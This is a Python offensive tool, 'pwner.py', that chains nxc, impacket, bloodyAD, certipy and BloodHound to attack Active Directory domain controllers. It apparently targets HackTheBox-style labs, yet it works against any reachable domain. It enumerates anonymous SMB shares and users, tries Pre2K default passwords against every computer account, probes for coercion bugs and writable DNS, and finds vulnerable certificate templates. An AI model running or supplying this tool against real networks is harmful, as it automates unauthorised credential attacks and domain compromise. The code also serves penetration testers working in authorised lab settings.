#!/usr/bin/env python3
"""
pwner.py - Python rewrite of pwner.sh
Features:
 - a lot
"""
#TODO: Add automatic ESC exploitation 
#TODO: Add mssql exploitation

#TODO: Line 267 has logic issue when user doesnt exist (aka when kerb is used)

import argparse, os, sys, re, json, tempfile, signal, shlex, shutil
from subprocess import run, CompletedProcess
from pathlib import Path

# ANSI colors
RED = '\033[0;31m'; GREEN = '\033[0;32m'; BLUE = '\033[0;34m'; YELLOW = '\033[0;33m'; RESET = '\033[0m'; BOLD = "\033[1m"

def status(ok, msg):
    prefix = f"{GREEN}[+]{RESET}" if ok else f"{RED}[-]{RESET}"
    print(f"{prefix} {msg}")

def get_tgt_impacket(domain, user, password, tmpdir):
    domain_up = domain.upper()
    status(True, f"Attempting impacket-getTGT for {domain_up}")
    outpath = Path(tmpdir) / "impacket_gettgt.out"
    # call impacket-getTGT safely
    r = run(["impacket-getTGT", f"{domain_up}/{user}:{password}"], capture_output=True, text=True)
    out = (r.stdout or "") + (r.stderr or "")
    outpath.write_text(out)
    # try to find .ccache in output
    m = re.search(r'(/[^ \n]*\.ccache)', out)
    if m:
        cc = Path(m.group(1))
        if cc.exists():
            return cc
    # fallback: newest .ccache in cwd or /tmp
    candidates = list(Path.cwd().glob("*.ccache")) + list(Path("/tmp").glob("*.ccache"))
    candidates.sort(key=lambda p: p.stat().st_mtime, reverse=True)
    if candidates:
        return candidates[0]
    return None

def detect_domain_from_nxc(ip):
    r = run(["nxc", "ldap", ip], capture_output=True, text=True)
    txt = (r.stdout or "") + (r.stderr or "")
    m = re.search(r'domain:([^\)\s]+)', txt)
    if m:
        return m.group(1)
    # fallback to any hostname.domain.tld
    m2 = re.search(r'([A-Za-z0-9._-]+\.[A-Za-z]{2,})', txt)
    if m2:
        return m2.group(1)
    return None

def run_bloodhound_nxc(fqdn, user, password, ip, use_kerb):
    print(f"{BLUE} => Running Bloodhound Collection...{RESET}")
    cmd = ["nxc", "ldap", fqdn]
    domain = fqdn.split(".", 1)[1]
    if use_kerb:
        cmd += ["-k"]
    else:
        cmd += ["-u", user, "-p", password]
    cmd += ["-d", domain, "--dns-server", ip, "-c", "All", "--bloodhound"]
    r = run(cmd, capture_output=True, text=True)
    out = (r.stdout or "") + (r.stderr or "")

    # Get zip path

    m = re.search(r'(/home/[^/\s]+/\.nxc/logs/[^\s"]+\.zip)', out)
    if not m:
        status(False, "Could not find BloodHound zip path in nxc output:")
        print(out)
        sys.exit(1)

    src = Path(m.group(1))
    if not src.exists():
        status(False, f"Reported zip path does not exist: {src}")
        sys.exit(1)

    
    dest = Path(f"./{domain}_{user or 'kerb'}_bhcol.zip")
    # replace existing dest 
    try:
        if dest.exists():
            dest.unlink()
        shutil.move(str(src), str(dest))
    except Exception as e:
        status(False, f"Failed to move zip: {e}")
        sys.exit(1)

    status(True, f"BloodHound collection saved to {dest}")
    return True

def smb_enumeration(ip, user, password, fqdn=None):
    print(f"{BLUE} => Enumerating SMB Shares...{RESET}")
    testing = run(
        ["nc", "-vz", ip, "445", "-w", "1"],
        capture_output=True,   # captures both stdout and stderr
        text=True,             # returns strings, not bytes
        timeout=5
    )

    out = (testing.stdout or "") + (testing.stderr or "")
    if "open" not in out.lower():
        status(False, "SMB doesn't seem to be open. Skipping..")
        return None
    if fqdn:
        out = run(["nxc", "smb", fqdn, "-k", "--shares"], capture_output=True, text=True)
        loggedonout = run(["nxc", "smb", fqdn, "-k", "--loggedon-users"], capture_output=True, text=True)
        run(["nxc", "smb", fqdn, "-k", "--generate-krb5-file", "krb5.conf"], text=True)
    else:
        out = run(["nxc", "smb", ip, "-u", user, "-p", password, "--shares"], capture_output=True, text=True)
        loggedonout = run(["nxc", "smb", ip, "-u", user, "-p", password, "--loggedon-users"], capture_output=True, text=True)
        run(["nxc", "smb", ip, "-u", user, "-p", password, "--generate-krb5-file", "krb5.conf"], text=True)
    print_clean(out.stdout)
    combined_log = (loggedonout.stdout or "") + (loggedonout.stderr or "")
    if "rpc_s_access_denied" in combined_log.lower():
        status(False, "Couldn't enum logged-on users using smb")
    else:
        lines = combined_log.splitlines(keepends=True)
        result = ''.join(lines[2:])
        status(True, "\nPossibly found logged-on users:")
        print(result)
    print(f"{YELLOW}[!]{RESET} Generated krb5 config. Environment variable has been properly configured.")
    os.environ["KRB5_CONFIG"] = "krb5.conf"

def print_clean(text):
    # accept CompletedProcess or string
    if isinstance(text, CompletedProcess):
        text = text.stdout or ""
    elif text is None:
        text = ""
    elif not isinstance(text, str):
        text = str(text)

    # Remove the "SMB fqdn port role" prefix from each line
    lines = []
    for ln in text.splitlines():
        no_prefix = re.sub(r'^[A-Z]+\s+\S+\s+\d+\s+\S+\s+', '', ln)
        # skip purely-empty lines
        if no_prefix.strip():
            lines.append(no_prefix.rstrip())

    if not lines:
        return

    # Try to find the header line (contains both 'Share' and 'Permissions')
    header_idx = None
    for i, ln in enumerate(lines):
        if re.search(r'\bShare\b', ln, re.IGNORECASE) and re.search(r'\bPermissions\b', ln, re.IGNORECASE):
            header_idx = i
            break
        # fallback: detect separator like "-----"
        if re.search(r'^\s*-{3,}\s+', ln):
            header_idx = max(0, i-1)  # include the line before the separator (likely header) if exists
            break

    if header_idx is not None:
        # keep everything from header onward (removes the initial noise)
        lines = lines[header_idx:]
    else:
        # otherwise, filter out explicit noise lines like "[*]" or "[+]"
        lines = [ln for ln in lines if not re.match(r'^\s*\[[\*\+!]', ln)]

    # Split rows into columns by 2+ spaces (keeps single-space data intact)
    rows = [re.split(r'\s{2,}', ln.strip()) for ln in lines if ln.strip()]

    if not rows:
        return

    # Normalize number of columns to 3 (Share, Permissions, Remark)
    for r in rows:
        while len(r) < 3:
            r.append('')

    # Compute column widths (based on content, but don't count ANSI codes)
    def visible_len(s: str) -> int:
        return len(re.sub(r'\033\[[0-9;]*m', '', s))

    col_widths = [0, 0, 0]
    for r in rows:
        for i in range(3):
            col_widths[i] = max(col_widths[i], visible_len(r[i]))

    # Print with alignment. Header (first row) printed raw (no coloring).
    print()  # blank line before table
    for idx, cols in enumerate(rows):
        share, perms, remark = cols[0], cols[1], cols[2]

        # If this is the header row (detect "Share" in first column), don't color
        is_header = bool(re.search(r'\bShare\b', share, re.IGNORECASE) and re.search(r'\bPermissions\b', perms, re.IGNORECASE)) \
                    or re.match(r'^\s*-{3,}\s*$', share)

        if is_header:
            share_s = share
            perms_s = perms
        else:
            share_s = f"{BOLD}{share}{RESET}" if share else ''
            perms_s = f"{YELLOW}{perms}{RESET}" if perms else ''

        # pad considering visible length (so ANSI codes don't break alignment)
        pad_share = col_widths[0] - visible_len(share)
        pad_perms = col_widths[1] - visible_len(perms)

        print(f"    {share_s}{' ' * pad_share}   {perms_s}{' ' * pad_perms}   {remark}")

def run_certipy(user, password, ip, domain_upper, tmp_txt, use_kerb):
    print(f"{BLUE} => Running Certipy...{RESET}")
    args = ["certipy", "find", "-vulnerable"]
    if use_kerb:
        args += ["-k", "-dc-ip", ip, "-target", f"{domain_upper}"]
    else:
        args += ["-u", user, "-p", password, "-dc-ip", ip]
    r = run(args, capture_output=True, text=True)
    Path(tmp_txt).write_text((r.stdout or "") + (r.stderr or ""))
    # attempt to discover corresponding json: search cwd and /tmp
    json_path = None
    for p in list(Path.cwd().glob("*Certipy*.json")) + list(Path("/tmp").glob("*Certipy*.json")):
        json_path = str(p)
    if json_path:
        parse_certipy_json(json_path)
    else:
        if "[Errno 104]" in Path(tmp_txt).read_text():
            status(False, "Certipy connection got reset by peer (Errno 104)")
        else:
            status(False, "Certipy ran into an error:")
            print(Path(tmp_txt).read_text() if Path(tmp_txt).exists() else "No certipy output")


def parse_certipy_json(jsonpath):
    if not jsonpath:
        return
    try:
        j = json.loads(Path(jsonpath).read_text())
    except Exception as e:
        status(False, f"Failed to parse JSON: {e}")
        return
    cas = j.get("Certificate Authorities", {})
    if not cas:
        status(False, "No Certificate Authorities in JSON")
        return
    for k,v in cas.items():
        name = v.get("CA Name", k)
        print(f"{GREEN}[+] CA: {name}{RESET}")
        vulns = v.get("[!] Vulnerabilities", {})
        if not vulns:
            print(f"{YELLOW}    No vulnerabilities found{RESET}")
        else:
            for vuln_name, vuln_info in vulns.items():
                print(f"    {GREEN}VULN: {vuln_name}{RESET}")
                if isinstance(vuln_info, dict):
                    desc = vuln_info.get("Description") or vuln_info.get("description") or str(vuln_info)
                    print(f"      {YELLOW}{desc}{RESET}")

def check_nxc_vulns(ip, user, password, fqdn=None):
    if fqdn:
        out = run(["nxc", "smb", fqdn, "-k", "-M", "coerce_plus"], capture_output=True, text=True)
    else:
        out = run(["nxc", "smb", ip, "-u", user, "-p", password, "-M", "coerce_plus"], capture_output=True, text=True)
    lines = out.stdout.splitlines()
    capture = False
    vuln_lines = []
    for line in lines:
        if capture:
            vuln_lines.append(line)
        elif "SMB" in line and f"\\{user}:" in line:
            capture = True  # start capturing after this line

    vuln_output = "\n".join(vuln_lines)
    if vuln_output.strip():
        status(True, "Found potential vulnerabilities:")
        s_lines = vuln_output.splitlines()
        skip_re = re.compile(r'Error in PrinterBug module: DCERPC Runtime Error: code: 0x16c9a0d6 - ept_s_not_registered')

        out_lines = [L for L in s_lines if not skip_re.search(L)]
        clean = "\n".join(out_lines)
        print(f"{YELLOW}{BOLD}{clean.strip()}{RESET}")
    else:
        status(False, "Didn't get a hit on any coerce vulnerabilities.")


# check pre2k vulns:
def check_pre2k(ip, user, password, fqdn, use_kerb):
    print(f"{BLUE} => Checking Pre2K legacy computer accounts...{RESET}")
    domain = fqdn.split(".", 1)[1] 
    # Build bloodyAD command
    if use_kerb:
        cmd = ["bloodyAD", "--host", fqdn, "-d", domain, "-k",
               "msldap", "query", "(objectClass=computer)", "--attributes", "sAMAccountName"]
    else:
        cmd = ["bloodyAD", "--host", ip, "-d", domain,
               "-u", user, "-p", password,
               "msldap", "query", "(objectClass=computer)", "--attributes", "sAMAccountName"]

    r = run(cmd, capture_output=True, text=True)
    out = (r.stdout or "") + (r.stderr or "")

    # Parse all sAMAccountNames except gMSAs
    accounts = [a for a in re.findall(r'sAMAccountName:\s*(\S+)', out) 
            if not a.startswith("gMSA")]
    if not accounts:
        status(False, "Couldn't retrieve computer accounts")
        return

    status(True, f"Found {len(accounts)} computer account(s), testing pre2k passwords...")

    for account in accounts:
        username = account.rstrip("$")
        password_attempt = username.lower()

        if use_kerb:
            test = run(["nxc", "ldap", ip, "-d", domain, "-u", account,
                        "-p", password_attempt, "-k"],
                       capture_output=True, text=True)
        else:
            test = run(["nxc", "ldap", ip, "-d", domain, "-u", account,
                        "-p", password_attempt],
                       capture_output=True, text=True)

        nxc_out = (test.stdout or "") + (test.stderr or "")
        if "[+]" in nxc_out:
            status(True, f"Pre2K hit! {account} : {password_attempt}")


def check_dns_records(ip, user, password, fqdn, use_kerb):

    domain = fqdn.split(".", 1)[1]
    cmdBase = ["bloodyAD", "--host"]
    if use_kerb:
        cmdBase += [fqdn, "-k"]
    else: 
        cmdBase += [ip, "-u", user, "-p", password]
    cmdBase += ["-d", domain]

    r = run(cmdBase + ["add", "dnsRecord", "test", "0.0.0.0"], capture_output=True, text=True)
    o = (r.stdout or "") + (r.stderr or "")
    if "[+] test has been successfully added" in o:
        status(True, "You can add DNS records!")
        r2 = run(cmdBase + ["remove", "dnsRecord", "test", "0.0.0.0"], capture_output=True, text=True)
        o2 = (r2.stdout or "") + (r2.stderr or "")
        if "[-] Given record has been successfully removed from test" in o2:
            status(True, "Succesfully removed test DNS record")
        else:
            status(False, "Failed to remove test DNS record.. You might want to check it out")
            if use_kerb:
                print(f"bloodyAD --host {fqdn} -d {domain} -k get dnsDump")
            else:
                print(f"bloodyAD --host {ip} -d {domain} -u {user} -p '{password}' get dnsDump")
    elif "INSUFF_ACCESS_RIGHTS" in o:
        status(False, "You can't add DNS records btw..")
    elif "[Errno 113] Connect call failed" in o:
        status(False, "Failed to connect to the target")
    else:
        status(False, "Got an unknown error while attempting to add a DNS record:")
        print(o)




def start(ip):
    print(f"{BLUE} => Pinging {ip}...{RESET}")
    ping_res = run(["ping","-c","1","-W","2", ip], capture_output=True, text=True)
    if ping_res.returncode != 0:
        status(False, f"Host {ip} unreachable")
        sys.exit(1)
    print(f"Sync times if you haven't already:\nfaketime \"$(ntpdate -q {ip} | cut -d ' ' -f 1,2)\" zsh\n")
    testing = run(
        ["nc", "-vz", ip, "445", "-w", "1"],
        capture_output=True,  
        text=True,             
        timeout=5
    )
    out = (testing.stdout or "") + (testing.stderr or "")
    if "open" not in out.lower():
        status(False, "SMB doesn't seem to be open.")
    else:
        print(f"{BLUE} => Checking SMB")
        smbcom = run(["nxc", "smb", ip], capture_output=True, text=True)
        domain = detect_domain_from_nxc(ip)
        cmd = f"dig +short ANY @{shlex.quote(ip)} {shlex.quote(domain)} | grep {shlex.quote(domain)} | head -n1 | sed 's/\\.$//'"
        res = run(cmd, shell=True, capture_output=True, text=True)
        fqdn = res.stdout.strip() or None
        status(True, f"Found domain: {domain} and FQDN: {fqdn}")
        if "NTLM:False" in smbcom.stdout:
            print(f"{YELLOW}[!] NTLM Authentication is disabled, use Kerberos!{RESET}")
        else:
            smbanonym = run(["nxc", "smb", ip, "-u", "anonymous", "-p", ""], capture_output=True, text=True)
            if "[+]" in smbanonym.stdout:
                print(f"{GREEN}[+] Anonymous login is enabled!{RESET}")
                enumShares = run(["nxc", "smb", ip, "-u", "anonymous", "-p", "", "--shares"], capture_output=True, text=True)
                if "Error enumerating shares: STATUS_ACCESS_DENIED" not in enumShares.stdout:
                    linesSh = enumShares.stdout.splitlines()
                    rest = "\n".join(linesSh[2:])
                    print(rest)
                else:
                    status(False, "Couldn't enumerate shares - Access denied")
                enumUsers = run(["nxc", "smb", ip, "-u", "anonymous", "-p", "", "--users"], capture_output=True, text=True)
                linesUs = enumUsers.stdout.splitlines()
                if len(linesUs) > 2:
                    status(True, "Potentially got a hit on users:\n")
                    restUs = "\n".join(linesUs[2:])
                    print(restUs)
                else:
                    status(False, "Couldn't enumerate users")
                enumPassPol = run(["nxc", "smb", ip, "-u", "anonymous", "-p", "", "--pass-pol"], capture_output=True, text=True)
                linesPP = enumPassPol.stdout.splitlines()
                if len(linesPP) > 2:
                    status(True, "Potentially got a hit on password policy:\n")
                    restPP = "\n".join(linesPP[2:])
                    print(restPP)
                else:
                    status(False, "Couldn't enumerate password policy")
                out = run(["nxc", "smb", ip, "-u", "anonymous", "-p", "", "-M", "coerce_plus"], capture_output=True, text=True)
                lines = out.stdout.splitlines()
                capture = False
                vuln_lines = []
                for line in lines:
                    if capture:
                        vuln_lines.append(line)
                    elif "SMB" in line and f"[+] {fqdn.split('.', 1)[1]}\\:" in line:
                            capture = True  # start capturing after this line

                vuln_output = "\n".join(vuln_lines)
                if vuln_output.strip():
                    status(True, "Found potential vulnerabilities:")
                    s_lines = vuln_output.splitlines()
                    skip_re = re.compile(r'Error in PrinterBug module: DCERPC Runtime Error: code: 0x16c9a0d6 - ept_s_not_registered')

                    out_lines = [L for L in s_lines if not skip_re.search(L)]
                    clean = "\n".join(out_lines)
                    print(f"{YELLOW}{BOLD}{clean.strip()}{RESET}")
                else:
                    status(False, "Didn't get a hit on any coerce vulnerabilities.")
                
    # Continue after finishing SMB
    print("You might also wanna check if you can enum usernames with kerbrute:" \
            f"~/Desktop/tools/kerbrute userenum -d {domain} /usr/share/seclists/Usernames/Names/names.txt --dc {ip}")
    testing = run(
        ["nc", "-vz", ip, "1433", "-w", "1"],
        capture_output=True,  
        text=True,             
        timeout=5
    )
    print(f"{BLUE} => Enumerating MSSQL{RESET}")
    out = (testing.stdout or "") + (testing.stderr or "")
    if "open" not in out.lower():
        status(False, "MSSQL doesn't seem to be open.")
    # TODO: add an else and start working on mssql exploitation
    # TODO: Also add other stuff like NFS, FTP, WMI etc.


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("ip")
    parser.add_argument("-u","--user")
    parser.add_argument("-p","--pass", dest="passwd")
    parser.add_argument("-k","--kerb", action="store_true")
    parser.add_argument("-d", "--domain", help="Specify target domain FQDN (e.g. voleur.htb)")
    parser.add_argument("--start", action="store_true")
    args = parser.parse_args()

    if not args.start and not args.kerb:
            if not args.user or not args.passwd:
                parser.error(f"{RED} [-]{RESET} You need to provide a username and pass with -u and -p when not using --start")
    
    # tempdir auto cleaned on exit
    with tempfile.TemporaryDirectory(prefix="pwner.") as tmpdir:
        # simple signal handling: ensure cleanup
        def on_sig(signum, frame):
            status(False, f"Interrupted (signal {signum}), exiting.")
            sys.exit(1)
        signal.signal(signal.SIGINT, on_sig)
        signal.signal(signal.SIGTERM, on_sig)
    
        ip = args.ip
        user = args.user
        password = args.passwd 
        
        if args.start:
            start(ip)
            print(f"{GREEN} ------- Pwner finished succesfully! -------{RESET}")
            sys.exit(0)

        print(f"{BLUE} => Pinging {ip}...{RESET}")
        ping_res = run(["ping","-c","1","-W","2", ip], capture_output=True, text=True)
        if ping_res.returncode != 0:
            status(False, f"Host {ip} unreachable")
            sys.exit(1)

        # Argument checks
        regexStr = re.compile(r'^[A-Za-z0-9-]+\.[A-Za-z0-9-]+\.[A-Za-z0-9-]+$') # Check if the domain is in the form of *.*.*
        if args.domain and not regexStr.match(args.domain):
            status(False, f"Invalid domain: {args.domain}\nProvide the FQDN e.g. dc01.voleur.htb") 
            sys.exit(1)
        elif args.domain:
            fqdn = args.domain
            domain = fqdn.split(".", 1)[1]
        else:
            domain = detect_domain_from_nxc(ip)
            cmd = f"dig +short ANY @{shlex.quote(ip)} {shlex.quote(domain)} | grep {shlex.quote(domain)} | head -n1 | sed 's/\\.$//'"
            res = run(cmd, shell=True, capture_output=True, text=True)
            fqdn = res.stdout.strip() or None
            if not fqdn:
                status(False, "Failed to get FQDN, consider specifying it with -d")
                sys.exit(1)
            else:
                status(True, f"Found FQDN: {fqdn}\nUsing Domain: {domain}")


        # Check kerberos stuff
        if args.kerb:
            if not os.environ.get("KRB5CCNAME") and (not user or not password):
                status(False, "Either provide a username and password or set KRB5CCNAME to a valid ticket.")
                sys.exit(1)
            elif not user or not password:
                r = run(["klist"], capture_output=True, text=True)
                o = (r.stdout or "") + (r.stderr or "")
                if "bad format" in o.lower() or "unsupported credentials" in o.lower():
                    status(False, f"Bad ticket file. Please set KRB5CCNAME to a valid ticket. Current ticket: {os.environ.get('KRB5CCNAME')}")
                    sys.exit(1)


        # Confirm creds
        if args.kerb and user and password:
            r = run(["nxc", "ldap", ip, "-u", user, "-p", password, "-k"], capture_output=True, text=True)
        elif args.kerb:
            r = run(["nxc", "ldap", ip, "-k"], capture_output=True, text=True)
        else:
            r = run(["nxc", "ldap", ip, "-u", user, "-p", password], capture_output=True, text=True)
        o = (r.stdout or "") + (r.stderr or "")
        if "[-]" in o:
            status(False, "LDAP credentials rejected")
            sys.exit(1)
        elif r.returncode != 0 or ("[+]" not in o):
            status(False, "Possibly unknown error occurred. Dumping output...")
            print(o)
            sys.exit(1)

        status(True, "LDAP credentials confirmed (nxc)")
        
        # Deal with kerberos stuff
        if args.kerb and user and password:
            cc = get_tgt_impacket(domain, user, password, tmpdir)
            if not cc:
                if "kerberos sessionerror: krb_ap_err_skew(clock skew too great)" in Path(tmpdir).joinpath("impacket_gettgt.out").read_text().lower():
                    status(False, "Yo you forgot the clock skew bud")
                    sys.exit(1)
                status(False, "No .ccache found after impacket-getTGT; check output") 
                print(Path(tmpdir).joinpath("impacket_gettgt.out").read_text())
                sys.exit(1)
            os.environ["KRB5CCNAME"] = str(cc)
            status(True, f"KRB5CCNAME set to {cc}")            
        elif args.kerb:
            status(True, f"Using ticket in KRB5CCNAME: {os.environ.get('KRB5CCNAME')}")


        # Enumeration start
        if not user:                                        # For certipy
            cert_txt = Path(tmpdir) / "certipy_kerb.txt" 
        else:
            cert_txt = Path(tmpdir) / f"certipy_{user}.txt"
        if args.kerb:
            check_dns_records(ip, user, password, fqdn, True)
            check_pre2k(ip, user, password, fqdn, True)
            run_bloodhound_nxc(fqdn, user, password, ip, use_kerb=True)
            smb_enumeration(ip, user, password, fqdn)
            check_nxc_vulns(ip, user, password, fqdn)
            run_certipy(user, password, ip, domain.upper(), str(cert_txt), True)
            
        else:
            check_dns_records(ip, user, password, fqdn, False)
            check_pre2k(ip, user, password, fqdn, False)
            run_bloodhound_nxc(fqdn, user, password, ip, False)
            smb_enumeration(ip, user, password, None)
            check_nxc_vulns(ip, user, password)
            run_certipy(user, password, ip, domain.upper(), str(cert_txt), False)

        

        print(f"{GREEN} ------- Pwner finished succesfully! -------{RESET}")

if __name__ == "__main__":
    main()